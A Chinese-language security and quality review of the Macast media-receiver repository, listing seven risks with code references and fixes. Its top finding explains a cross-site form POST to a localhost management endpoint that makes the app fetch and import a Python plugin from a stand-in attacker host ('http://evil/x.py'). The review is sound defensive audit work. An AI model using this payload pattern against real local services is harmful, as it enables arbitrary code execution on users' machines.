# 架构风险 / 质量评审 — pingod/Macast

- **评审日期**：2026-09-25
- **评审对象**：`pingod/Macast`（`xfangfang/Macast` 分支），跨平台菜单栏 DLNA / Chromecast / AirPlay 接收端
- **干系人 / 目标**：唯一维护者（pavia / pingod）。目标是**在继续高频迭代发送端插件族（screen_mirror / cast_local_file / cast_bridge）的同时不引入回退**，并保证产物在 mac / Windows / Linux 三平台可发版。
- **风险容忍度**：安全 = 低（应用监听局域网 + 本机端口，且能任意下载并 import `.py`）；可维护性 = 中（单人项目，重写成本高）。
- **关注的质量属性**：安全性、可维护性、可靠性（并发 / 进程生命周期）、可测试性。
- **方法**：结构度量（`wc -l`）+ 源码逐行取证 + `AGENTS.md` 战史交叉验证。每个结论都给 `file:line`。**未经实时利用验证的项显式标注为假设。**
- **产出工具**：`risk-quality-reviewer`（场景）+ `graphviz`（`risk-map.dot`）。

> 这份仓库的 `AGENTS.md` 异常详尽，绝大多数"踩过的坑"已记录在案。本评审因此**不复述战史**，只做两件事：
> ① 指出 `AGENTS.md` 的威胁模型**自身不一致**之处（R1，最高优先级）；② 把散落在多个文件里的结构性风险**归并成可决策的条目**。

---

## 摘要（按优先级）

| # | 发现 | 质量属性 | 严重度 | 置信度 | 状态 |
|---|---|---|---|---|---|
| R1 | `install-plugin` / `save-launch-param` 走"本机即可信"门，且无 Origin/CSRF 校验 → 恶意网页可对 `127.0.0.1` 发 form-POST 触发**任意代码执行** | 安全 | **高** | 高（代码事实）/ 中（端到端利用，未做实时 PoC） | 已确认代码路径 |
| R2 | 单体热点：验证套件 16,010 行 / `screen_mirror.py` 8,046 行 / `protocol.py` 的 `Handler` 类 ~846 行 / `setting.html` 2,908 行 | 可维护性、可审计性 | 高 | 高 | 已确认 |
| R3 | DLNA `event_subscribes` 无锁：worker 线程边迭代、事件线程边插入 → `dictionary changed size during iteration` | 可靠性 | 中 | 中（时序相关，频率未证实） | 已确认代码路径 |
| R4 | `app_notify` 订阅者在**发布它的 CherryPy 线程**上直接操作托盘，未走主线程 hop（与菜单重建不一致） | 可靠性 | 中 | 高（离线线程）/ 中（缓解后是否仍出问题） | **已修**（2026-09-25，套件 Part 47） |
| R5 | 回归护栏有被"常态化"的盲区：套件全打桩网络、Part 34 永久红、Cast Streaming 全族未见过真电视 | 可测试性 | 中 | 高 | 已确认（部分为已知取舍） |
| R6 | import 期与读取期副作用：`SETTING_DIR` 导入时定死、`Setting.get` 读带写、多实例回写端口/USN | 可维护性、正确性 | 低-中 | 高 | 已确认（部分为已知取舍） |
| R7 | 202 处 `except Exception`（screen_mirror 57 / cast_local_file 25）——密度高，与"静默失效"反复出现同源 | 可靠性 | 低 | 中 | 已确认 |

---

## R1 — 管理端点的 CSRF → 任意代码执行（最高优先级）

**证据**
- `macast/protocol.py:1290-1307` `_management_allowed()`：`remote.ip` 属于 `127.0.0.1/::1/localhost` 即返回 `True`，**不看令牌**。
- `macast/protocol.py:1984-1989`：`install-plugin` 等 `_MANAGEMENT_PARAMS` 只用 `_management_allowed()` 把关。
- `macast/protocol.py:2028-2042`：`install-plugin` 分支 → `manager.install_url(url, type)`。
- `macast/macast.py:554-571` `install_url` → `requests.get(url)` 写入插件目录 → `install_file` → `refresh()` → `importlib.import_module`（`macast/macast.py:48/55/70`）。**下载即 import = 以用户身份执行任意 Python。**
- `macast/protocol.py:2016-2026` `save-launch-param`：整体覆盖 `Setting.setting` 并 `save()` + `restart()`，同样只被"本机可信"放行。
- `macast/protocol.py:1942` `POST()` 全程**无** `Origin` / `Referer` / CSRF token 校验；`_token_present`（`protocol.py:1287`）只读 `X-Macast-Token` 头或 `token` 参数。

**为什么这是真风险（而不是"局域网本来就开放"）**
`application/x-www-form-urlencoded` 是 CORS 的 *simple request* content-type，浏览器**不发预检**，跨源 form-POST 的副作用照样执行（只是响应读不到）。用户访问任意恶意网页时，该网页可自动提交
`<form method=POST action="http://127.0.0.1:58880/api">`（字段 `install-plugin=1&plugin-url=http://evil/x.py`），服务端看到的 `remote.ip` 就是 `127.0.0.1` → 门开 → 拉取并 import 攻击者的 `.py`。

**关键：这违反了本仓库自己已经确立的威胁模型。** 同一份代码在别处**明确**防的就是这一招：
- `protocol.py:1635-1647`：GET `cast` **即使来自本机也强制要令牌**，注释写着"any page the user visits can fire a GET at 127.0.0.1"。
- `protocol.py:2006-2014`：`mirror-action` **即使来自本机也要令牌**，注释写着"a page the user visits can post a form to 127.0.0.1 just as easily as it can GET one"。

也就是说，作者已经论证过"form-POST 能打到本机"这个前提，却把**破坏力最强的两个端点**（装插件 = RCE、覆盖设置 = 重启并改写全部配置）留在了较弱的那道门上。这是威胁模型内部的不一致，不是有意取舍。

**修复（最小、与既有约定对齐）**
把 `install-plugin`、`plugin-file` 上传（`protocol.py:1955-1961`）、`save-launch-param` 的判定从 `_management_allowed()` 升级为 `_token_present()`，与 `mirror-action` 一致。设置页本就通过 `query=cast-info`（本机）拿到令牌，改造成本仅限这几行 + 页面带上令牌。

**验收标准**
- 无令牌的 loopback POST `install-plugin` / `save-launch-param` 返回 403；带正确 `X-Macast-Token` 才执行。
- 新增套件用例（沿用 Part 12 的假 loopback 手法）：模拟"本机 + 无令牌 + install-plugin"必须被拒。

**置信度与待验证项**：代码路径高置信。端到端利用依赖浏览器 CORS-simple 行为（业界共识）+ 用户运行时访问恶意页，**我未做实时 drive-by PoC**——修复前建议在本机用一条 `curl`（模拟 form-POST、不带令牌）确认现状确实会执行，以坐实"现状可利用"。

---

## R2 — 单体热点（可维护性 / 可审计性）

**度量（`wc -l`）**
- `scripts/verify_cast_airplay.py` **16,010 行**，单文件，且是**唯一的回归护栏**。
- `macast/plugins/renderer/screen_mirror.py` **8,046 行**，单文件插件，承载采集 / 编码 / 两种容器（TS / fMP4 / MKV / PS）/ Cast Streaming / DLNA 伪装成文件 / HTTP 广播 / 一键 BlackHole 安装 / 控制台状态派生。
- `macast/protocol.py` 的 `Handler` 类跨 `1250→2096`（**~846 行一个类**），`POST()` 用 ~150 行 if/elif 按**字段名**分发，每个分支各自决定用令牌、用本机、还是不用门。
- `macast/xml/setting.html` **2,908 行**，Vue2 单文件内嵌模板。

**影响**
1. 上手 / 评审成本高：改 screen_mirror 任一条红线都要在 8k 行里定位。
2. **直接放大 R1**：门控散落在 `POST` 的每个 `elif` 里，所以"漏一个端点没加令牌"这类错误无法被结构发现——正是 R1 的成因。
3. 套件单文件 16k 行使得"跑其中一段"困难，且 Part 之间共享全局（`MACAST`、`check`），一个 Part 的顶层异常可能牵连后续。

**修复方向（渐进，不必大爆炸）**
- 把 `Handler` 的 POST 分发改成**声明式路由表**：每行 `(字段, 处理函数, 门控级别)`，门控成为数据、可被一条用例枚举校验"所有写操作端点 ≥ token 门"。这一步同时收 R1 与 R2 的可审计性。
- `screen_mirror.py` 按关注点拆分（capture / encoder-args / container / caststream / dlna-file / http-server / setup-wizard / console-state），`mirror_view.py` 已是"把派生逻辑外提"的成功先例，照此继续。
- 验证套件按 Part 边界切成模块（`tests/part_XX_*.py`），保留一个聚合入口。

**验收标准**：无单文件 > ~3k 行；`Handler` 类 < ~300 行；写端点门控由表驱动并被用例覆盖。

---

## R3 — DLNA 订阅表无锁并发

**证据**：`protocol.py:471` `event_subscribes` 无锁；`add_subscribe`（`protocol.py:568-574`）在 **CherryPy worker 线程**上迭代该 dict，而事件线程在 `protocol.py:653` `_sync_subscribe_list` 插入。设计注释（`protocol.py:651-652`）声称"单写者"，但 `add_subscribe` 的迭代读打破了它。
**失败模式**：并发 SUBSCRIBE 与事件入表交错时 `RuntimeError: dictionary changed size during iteration` → 该 SOAP SUBSCRIBE 请求 500。状态读取侧有 try/except 兜底（`protocol.py:1610/1619`），`add_subscribe` 没有。
**修复**：迭代前取快照（`list(event_subscribes.items())`）或用现有锁保护读迭代。
**置信度**：中——路径确认，触发频率取决于订阅与事件入表的时序，未实测复现。

---

## R4 — 通知在发布线程上直接操作托盘

**证据**：`App.call_on_main_thread`（`gui.py:222`）正确地把菜单重建（`macast.py:1061` 的 `_apply_app_menu`、`1351` 的 `_refresh_ip_menu`、`1497` 的 `_rebuild_menu`）marshal 回主线程。但 `app_notify` 订阅者 `notification()`（`gui.py:319`）由 `cherrypy.engine.publish('app_notify', …)` **直接在发布它的那个线程**上调用。**publish 调用点的数量按 AST 现数为 52 处**（`macast/` 49 + `macast_renderer/mpv.py` 3；`screen_mirror.py` 只有 1 处，本条最初写的"约 30 处"是把别的东西数了进来 —— 现已由 Part 47 拿这个数字反过来比对文档），分布在 CherryPy 工作线程、mpv 的 IPC 线程与镜像线程上。
**关联**：`AGENTS.md` §4.8 记录的 Windows pystray 气泡崩溃正是这条路径；当前修复（`fit_notification` + `gui.py:330` 的 try/except）**治的是"消息过长"与"异常冒泡"，没治"离线线程调 AppKit/Win32 托盘"**。菜单不敢离线改，通知却离线发——不一致。
**修复**：`notification()` 也走 `call_on_main_thread`（Darwin 尤其重要）。
**置信度**：离线线程=高；"缓解后仍会因线程问题出问题"=中。
**已修（2026-09-25）**：这一条被用户报的实症状坐实了 —— "菜单有时要点好几次，点一次就又消失了"。上游事实量过：**rumps 0.4.0 里 `callAfter` 出现 0 次**，它自己一次都不做主线程派发，所以正在 tracking 的 NSMenu 一旦被别的线程改动就当场收起。两处违规一起收了：`App.notification`（Darwin 分支走队列，pystray 分支**故意不动**，因为 §4.8"通知失败不许吃掉 teardown"的契约是按它就地截断/就地抛写的）与 `Macast.update_service_status`（cherrypy 的 `start`/`stop` 钩子跑在 SERVICE_THREAD，它写的 `toggle_menuitem.text` 就是 `NSMenuItem setTitle_`，正落在用户点服务开关的那一瞬间）。套件 Part 47（24 条）钉住这条纪律：从两个假线程各打一次，要求"就地什么都没发生、排队的东西在 MainThread 落地"，并扫 `macast.py` 与 `macast/plugins/**` 的菜单写入点（每处必须报得出"我为什么在主线程上"）；两个变异体各自红 5 条与 7 条。延后能否真落地是**真机**问题，已用真 rumps 事件循环探过 4/4：`app.run()` 之前排的队，循环一起来就执行。见 `AGENTS.md` §4.2 末条。

---

## R5 — 回归护栏的常态化盲区（可测试性）

- **网络全打桩**：`verify_cast_airplay.py` 从不真发网络包，因此**结构上抓不到"发送端不认账"**（`AGENTS.md` §4.9 自陈）。真正用实栈的 `cast_conformance.py` / `e2e_smoke.py` / `cast_streaming_probe.py` 都是**手动、仅发版前**。
- **Part 34 永久红**：本克隆缺 215 条上游对象，来源台账 6 条用例每次跑都红（§4.12）。一个常驻的"已知红基线"会训练所有贡献者**忽略红色**——这是危险的文化信号。
- **Cast Streaming 全族未见过真硬件**：§4.8 明说"这套字段全部是从 openscreen 转写来的，没有任何一条见过真电视"，Part 24 的假设备与发送端**共用同一张表**，只能证明自洽。

**修复方向**：① CI 把"红集恰好等于 {Part 34}"作为断言，而不是容忍任意红；② 把 `e2e_smoke.py` 接入每日定时（它会在本机起第二个实例，适合夜间专用机）；③ 未真机验证的通道在设置页 UI 上继续显式标注"未经真电视验证"（已部分做到，保持）。

---

## R6 — import 期 / 读取期副作用

- `SETTING_DIR` 在 `macast/utils.py` **导入时**由 appdirs 定死 → 任何隔离测试必须在 `import macast` **之前** monkeypatch appdirs（`e2e_smoke.py` BOOTSTRAP、Part 33 全靠字符串耦合守住这一点）。
- `Setting.get(key, default)` **读带写**副作用（§4.2）：读不存在的键会把 default 落盘。存在性判断被迫用 `has()`。
- 多实例启动会把 `ApplicationPort` 回写进**用户真实配置**并重置 USN（§4.2、§8 实测 `58880→50116`）。

**修复方向**：让 `SETTING_DIR` 可注入（环境变量 / 函数参数），把 `Setting` 的读与写拆成显式两个 API。属结构性摩擦，非紧急。

---

## R7 — 宽异常吞没密度

202 处 `except Exception`（`screen_mirror.py` 57、`cast_local_file.py` 25、`protocol.py` 19）。多数是有意的边界（监督外部进程、可选依赖降级），但 `AGENTS.md` 反复出现"静默失效 / 静默丢弃 / 静默黑屏"字样，说明**吞异常 + 不上报状态**这一组合在本仓库是反复复发的根因。
**建议约定**：`except` 必须记到能落到文件的级别；热路径吞异常时必须在 `console_state()` / 页面可见状态里留一个可 surfacing 的标记（screen_mirror 的 `audio_dropped()` 就是这个模式的正例，推广它）。

---

## 风险关系图

见 `docs/risk-map.dot`（Graphviz 源，`rankdir=TB`）。核心可读结论：**R2 的"门控散落在 if/elif"是 R1 的结构性成因**；R3/R4 同属"跨线程共享状态缺一致性纪律"一族；R5 让 R1/R3/R4 这类"真网络/真线程/真硬件才暴露"的问题**系统性逃过套件**。

## 建议的下一步（顺序）

1. **先坐实 R1**：本机 `curl` 模拟无令牌 form-POST 打 `install-plugin`，确认现状可利用 → 按 `mirror-action` 模式升级到令牌门 + 补套件用例。（高优先、改动小、可逆）
2. 把 `Handler.POST` 改成声明式路由表（同时收 R1 的可审计性与 R2）。
3. R4 通知走主线程 hop（**已修 2026-09-25**：`App.notification` 与 `Macast.update_service_status` 都走 `call_on_main_thread`，Part 47 24 条 + 真 rumps 循环探针）；R3 订阅表读迭代取快照。
4. R5 CI 断言"红集 == {Part 34}"、e2e 进夜间。
5. R2 / R6 的结构性拆分列入中期重构队列。
